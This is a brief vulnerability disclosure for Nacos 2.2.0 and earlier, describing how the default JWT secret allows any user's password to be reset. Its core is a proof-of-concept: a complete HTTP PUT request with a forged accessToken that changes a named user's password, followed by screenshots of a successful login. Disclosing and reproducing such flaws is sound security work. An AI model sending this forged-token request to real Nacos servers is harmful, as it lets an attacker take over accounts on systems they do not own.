#### Vuln Impact 

An issue has been discovered in Nacos affecting Nacos <= 2.2.0. When a user uses the default JWT Key, it will cause an attacker to reset the password of any user and take over the user account.

#### Vuln Product

Nacos <= 2.2.0 version

#### Vulnerability reappearance

Step 1：Get username (can use old vulnerability or guess)

![getuser](img/getuser.png)

Step 2：restpassword

```javascript
PUT /nacos/v1/auth/users HTTP/1.1
Host: xx.xx.xxx.xx
Content-Length: 33
Accept: application/json, text/plain, */*
accessToken: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbDFleCIsImV4cCI6MTY2ODA4OTk2N30.hv0MWlHISYCgvIDQhidQBCeyYb7tbG0JrbNyx-9kDzc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=
Connection: close

username=al1ex&newPassword=al22ex
```

![reset](img/reset.png)

Step 3: Log in successfully

![logins](img/logins.png)







